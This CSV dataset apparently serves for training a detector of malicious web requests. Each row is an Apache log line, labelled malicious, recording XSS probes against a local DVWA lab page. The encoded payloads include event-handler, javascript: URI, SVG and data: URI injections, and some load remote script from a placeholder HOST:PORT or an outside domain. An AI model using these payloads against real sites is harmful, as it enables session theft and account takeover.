url,malicious
"127.0.0.1 - - [03/May/2021:02:24:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20o%6Exxx%3d1%20 HTTP/1.1"" 200 1667 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20on%78xx%3d1%20 HTTP/1.1"" 200 1667 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20onxxx%3D1 HTTP/1.1"" 200 1667 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cX%20onxxx%3d1%20 HTTP/1.1"" 200 1668 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20OnXxx%3d1%20 HTTP/1.1"" 200 1668 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cX%20OnXxx%3d1%20 HTTP/1.1"" 200 1668 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20onxxx%3d1%20onxxx%3d1 HTTP/1.1"" 200 1668 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%2fonxxx%3d1%20 HTTP/1.1"" 200 1667 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:39 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%09onxxx%3d1%20 HTTP/1.1"" 200 1668 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%0Aonxxx%3d1%20 HTTP/1.1"" 200 1668 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%0Conxxx%3d1%20 HTTP/1.1"" 200 1668 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:48 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%0Donxxx%3d1%20 HTTP/1.1"" 200 1668 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%2Fonxxx%3d1%20 HTTP/1.1"" 200 1667 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%201%3d'1'onxxx%3d1%20 HTTP/1.1"" 200 1672 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:24:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%201%3d%221%22onxxx%3d1 HTTP/1.1"" 200 1670 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:25:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20%3c%2fonxxx%3d1%20 HTTP/1.1"" 200 1667 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:25:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%201%3d%22%3e%22%20onxxx%3d1%20 HTTP/1.1"" 200 1671 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:25:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3chttp%3a%2f%2fonxxx%3D1%2f HTTP/1.1"" 200 1668 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:25:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20onxxx%3dalert(1)%201%3d' HTTP/1.1"" 200 1674 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:25:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3csvg%20onload%3dsetInterval(function()%7bwith(document)body%2eappendChild(createElement('script'))%2esrc%3d'%2f%2fHOST%3aPORT'%7d,0)%3e HTTP/1.1"" 200 1742 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:25:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name='onload%3dalert(1)%3e%3csvg%2f1%3d' HTTP/1.1"" 200 1676 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:25:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name='%3ealert(1)%3c%2fscript%3e%3cscript%2f1%3d'%20 HTTP/1.1"" 200 1674 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:25:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%2a%2falert(1)%3c%2fscript%3e%3cscript%3e%2f%2a HTTP/1.1"" 200 1673 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:25:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%2a%2falert(1)%22%3e'onload%3d%22%2f%2a%3csvg%2f1%3d' HTTP/1.1"" 200 1680 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:25:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%60-alert(1)%22%3e'onload%3d%22%60%3csvg%2f1%3d' HTTP/1.1"" 200 1680 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:25:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%2a%2f%3c%2fscript%3e'%3ealert(1)%2f%2a%3cscript%2f1%3d' HTTP/1.1"" 200 1677 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:25:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3ealert(1)%3c%2fscript%3e%20 HTTP/1.1"" 200 1670 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:25:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3djavascript%3aalert(1)%3e%20 HTTP/1.1"" 200 1671 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:25:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3ciframe%20src%3djavascript%3aalert(1)%3e%20 HTTP/1.1"" 200 1675 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:25:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cembed%20src%3djavascript%3aalert(1)%3e%20 HTTP/1.1"" 200 1676 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:25:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3djavascript%3aalert(1)%3eclick%20 HTTP/1.1"" 200 1674 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:26:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cmath%3e%3cbrute%20href%3djavascript%3aalert(1)%3eclick%20 HTTP/1.1"" 200 1681 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:26:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cform%20action%3djavascript%3aalert(1)%3e%3cinput%20type%3dsubmit%3e%20 HTTP/1.1"" 200 1677 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:26:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cisindex%20action%3djavascript%3aalert(1)%20type%3dsubmit%20value%3dclick%3e%20 HTTP/1.1"" 200 1686 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:26:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cform%3e%3cbutton%20formaction%3djavascript%3aalert(1)%3eclick%20 HTTP/1.1"" 200 1681 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:26:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cform%3e%3cinput%20formaction%3djavascript%3aalert(1)%20type%3dsubmit%20value%3dclick%3e%20 HTTP/1.1"" 200 1685 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:26:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cform%3e%3cinput%20formaction%3djavascript%3aalert(1)%20type%3dimage%20value%3dclick%3e%20 HTTP/1.1"" 200 1687 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:26:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cform%3e%3cinput%20formaction%3djavascript%3aalert(1)%20type%3dimage%20src%3dSOURCE%3e%20 HTTP/1.1"" 200 1689 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:26:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cisindex%20formaction%3djavascript%3aalert(1)%20type%3dsubmit%20value%3dclick%3e%20 HTTP/1.1"" 200 1688 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:26:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cobject%20data%3djavascript%3aalert(1)%3e%20 HTTP/1.1"" 200 1676 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:26:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3ciframe%20srcdoc%3d%3csvg%2fo%26#x6Eload%26equals%3balert%26lpar%3b1)%26gt%3b%3e%20 HTTP/1.1"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:26:48 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3csvg%3e%3cscript%20xlink%3ahref%3ddata%3a,alert(1)%20%2f%3e%20 HTTP/1.1"" 200 1683 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:26:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cmath%3e%3cbrute%20xlink%3ahref%3djavascript%3aalert(1)%3eclick%20 HTTP/1.1"" 200 1686 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:26:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3csvg%3e%3ca%20xmlns%3axlink%3dhttp%3a%2f%2fwww%2ew3%2eorg%2f1999%2fxlink%20xlink%3ahref%3d%3f%3e%3ccircle%20r%3d400%20%2f%3e%3canimate%20attributeName%3dxlink%3ahref%20begin%3d0%20from%3djavascript%3aalert(1)%20to%3d%26%3e HTTP/1.1"" 200 1750 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:27:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3chtml%20ontouchstart%3dalert(1)%3e%20 HTTP/1.1"" 200 1677 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:27:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3chtml%20ontouchend%3dalert(1)%3e%20 HTTP/1.1"" 200 1675 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:27:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3chtml%20ontouchmove%3dalert(1)%3e%20 HTTP/1.1"" 200 1676 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:27:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3chtml%20ontouchcancel%3dalert(1)%3e HTTP/1.1"" 200 1677 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:27:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20onorientationchange%3dalert(1)%3e HTTP/1.1"" 200 1680 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:27:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3cimg%20src%3d1%20onerror%3dalert(1)%3e%2egif HTTP/1.1"" 200 1678 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:27:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3csvg%20xmlns%3d%22http%3a%2f%2fwww%2ew3%2eorg%2f2000%2fsvg%22%20onload%3d%22alert(document%2edomain)%22%2f%3e HTTP/1.1"" 200 1704 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:27:41 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=GIF89a%2f%2a%3csvg%2fonload%3dalert(1)%3e%2a%2f%3dalert(document%2edomain)%2f%2f%3b HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:27:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22data%3a%26comma%3balert(1)%2f%2f HTTP/1.1"" 200 1674 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:27:52 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3cscript%20src%3ddata%3a%26comma%3balert(1)%2f%2f HTTP/1.1"" 200 1676 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:27:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22%2f%2fbrutelogic%2ecom%2ebr%26sol%3b1%2ejs%26num%3b%20 HTTP/1.1"" 200 1684 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:28:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3cscript%20src%3d%2f%2fbrutelogic%2ecom%2ebr%26sol%3b1%2ejs%26num%3b%20 HTTP/1.1"" 200 1685 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:28:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3clink%20rel%3dimport%20href%3d%22data%3atext%2fhtml%26comma%3b%26lt%3bscript%26gt%3balert(1)%26lt%3b%26sol%3bscript%26gt%3b%20 HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:28:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3clink%20rel%3dimport%20href%3ddata%3atext%2fhtml%26comma%3b%26lt%3bscript%26gt%3balert(1)%26lt%3b%26sol%3bscript%26gt%3b HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:28:22 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cbase%20href%3d%2f%2f0%3e HTTP/1.1"" 200 1665 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:28:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%2fsrc%3d%22data%3a%26comma%3beval(atob(location%2ehash%2eslice(1)))%2f%2f#alert(1) HTTP/1.1"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:28:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20onload%3dalert(1)%3e HTTP/1.1"" 200 1670 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:28:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20onpageshow%3dalert(1)%3e HTTP/1.1"" 200 1674 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:28:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20onfocus%3dalert(1)%3e HTTP/1.1"" 200 1672 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:28:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20onhashchange%3dalert(1)%3e%3ca%20href%3d#x%3eclick%20this!#x HTTP/1.1"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:28:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20style%3doverflow%3aauto%3bheight%3a1000px%20onscroll%3dalert(1)%20id%3dx%3e#x HTTP/1.1"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:29:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20onscroll%3dalert(1)%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e HTTP/1.1"" 200 1676 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:29:12 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e HTTP/1.1"" 200 1663 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:29:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e HTTP/1.1"" 200 1663 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:29:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cx%20id%3dx%3e#x HTTP/1.1"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:29:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20onresize%3dalert(1)%3epress%20F12! HTTP/1.1"" 200 1681 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:29:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20onhelp%3dalert(1)%3epress%20F1!%20(MSIE) HTTP/1.1"" 200 1683 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:29:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cmarquee%20onstart%3dalert(1)%3e HTTP/1.1"" 200 1676 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:29:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cmarquee%20loop%3d1%20width%3d0%20onfinish%3dalert(1)%3e HTTP/1.1"" 200 1688 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
